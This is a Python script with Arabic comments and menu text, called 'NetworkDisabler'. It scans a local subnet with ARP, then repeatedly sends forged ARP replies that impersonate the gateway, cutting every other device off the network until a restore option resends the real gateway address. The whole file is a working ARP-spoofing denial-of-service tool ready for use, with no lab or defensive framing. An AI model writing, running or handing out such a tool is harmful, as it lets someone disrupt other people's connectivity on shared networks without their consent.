from scapy.all import ARP, send, Ether, srp
import time
import threading
import subprocess
import platform

class NetworkDisabler:
    def __init__(self, gateway_ip):
        self.gateway_ip = gateway_ip
        self.running = False
        self.devices = []
        
    def scan_network(self):
        """فحص الشبكة للحصول على جميع الأجهزة"""
        print("جاري فحص الشبكة...")
        try:
            # إنشاء طلب ARP
            arp_request = ARP(pdst=f"{self.gateway_ip.rsplit('.', 1)[0]}.0/24")
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/arp_request
            
            # إرسال الطلب واستقبال الردود
            answered_list = srp(arp_request_broadcast, timeout=3, verbose=False)[0]
            
            # حفظ الأجهزة المكتشفة
            for element in answered_list:
                ip = element[1].psrc
                mac = element[1].hwsrc
                self.devices.append({'ip': ip, 'mac': mac})
                
            print(f"تم اكتشاف {len(self.devices)} جهاز")
            
        except Exception as e:
            print(f"خطأ في فحص الشبكة: {e}")
    
    def disconnect_all(self):
        """فصل جميع الأجهزة عن الشبكة"""
        if self.running:
            print("عملية الفصل قيد التشغيل بالفعل!")
            return
            
        self.running = True
        print("بدء فصل جميع الأجهزة...")
        
        def disconnect_loop():
            while self.running:
                try:
                    # فصل كل جهاز على حدة
                    for device in self.devices:
                        if device['ip'] != self.gateway_ip:  # عدم فصل البوابة
                            # إنشاء حزم ARP مزيفة
                            arp_packet = ARP(op=2, pdst=device['ip'], psrc=self.gateway_ip)
                            send(arp_packet, verbose=False)
                    
                    time.sleep(1)
                    
                except Exception as e:
                    print(f"خطأ: {e}")
                    break
        
        thread = threading.Thread(target=disconnect_loop)
        thread.daemon = True
        thread.start()
    
    def restore_all(self):
        """إعادة الاتصال لجميع الأجهزة"""
        self.running = False
        print("جاري إعادة الاتصال...")
        
        try:
            # الحصول على عنوان MAC الحقيقي للبوابة
            arp_request = ARP(pdst=self.gateway_ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/arp_request
            answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
            
            if answered_list:
                real_mac = answered_list[0][1].hwsrc
                
                # إرسال حزم ARP الصحيحة لكل جهاز
                for device in self.devices:
                    if device['ip'] != self.gateway_ip:
                        arp_packet = ARP(
                            op=2,
                            pdst=device['ip'],
                            psrc=self.gateway_ip,
                            hwsrc=real_mac
                        )
                        send(arp_packet, verbose=False)
                
                print("تم إعادة الاتصال بنجاح")
                
        except Exception as e:
            print(f"خطأ في إعادة الاتصال: {e}")

def main():
    gateway_ip = "192.168.1.1"  # عدل حسب شبكتك
    disabler = NetworkDisabler(gateway_ip)
    
    print("أداة التحكم في الشبكة")
    print("=" * 50)
    print(f"البوابة: {gateway_ip}")
    print("=" * 50)
    
    # فحص الشبكة أولاً
    disabler.scan_network()
    
    if not disabler.devices:
        print("لم يتم العثور على أجهزة في الشبكة!")
        return
    
    print("\nالأجهزة المكتشفة:")
    print("-" * 50)
    for device in disabler.devices:
        print(f"IP: {device['ip']}\tMAC: {device['mac']}")
    print("-" * 50)
    
    print("\nالخيارات:")
    print("1 - فصل جميع الأجهزة")
    print("2 - إعادة الاتصال")
    print("3 - خروج")
    print("=" * 50)
    
    try:
        while True:
            choice = input("\nاختر (1/2/3): ")
            
            if choice == "1":
                disabler.disconnect_all()
            elif choice == "2":
                disabler.restore_all()
            elif choice == "3":
                disabler.restore_all()
                break
            else:
                print("خيار غير صحيح!")
                
    except KeyboardInterrupt:
        disabler.restore_all()

if __name__ == "__main__":
    main()
